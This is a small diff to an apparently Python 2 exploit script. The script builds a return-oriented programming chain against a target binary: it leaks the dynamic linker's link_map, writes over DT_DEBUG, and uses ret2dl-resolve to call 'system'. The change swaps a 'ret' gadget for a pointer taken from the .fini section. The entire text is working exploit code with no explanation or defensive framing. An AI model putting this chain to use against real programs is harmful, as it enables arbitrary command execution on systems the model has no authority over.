@@ -5,6 +5,7 @@ offset = int(sys.argv[2])
 
 rop = ROP(fpath)
 addr_stage = rop.section('.bss') + 0x400
+ptr_ret = rop.search(rop.section('.fini'))
 
 buf = rop.retfill(offset)
 buf += rop.call_chain_ptr(
@@ -18,10 +19,9 @@ print "[+] read: %r" % p.read(len(buf))
 addr_link_map = p.read_p64()
 addr_dt_debug = addr_link_map + 0x1c8
 
-buf = p64(rop.gadget('ret'))
-buf += rop.call_chain_ptr(
+buf = rop.call_chain_ptr(
     ['read', 0, addr_dt_debug, 8],
-    [addr_stage, addr_stage+380]
+    [ptr_ret, addr_stage+380]
 )
 buf += rop.dl_resolve(addr_stage + len(buf), 'system')
 buf += rop.fill(380, buf)
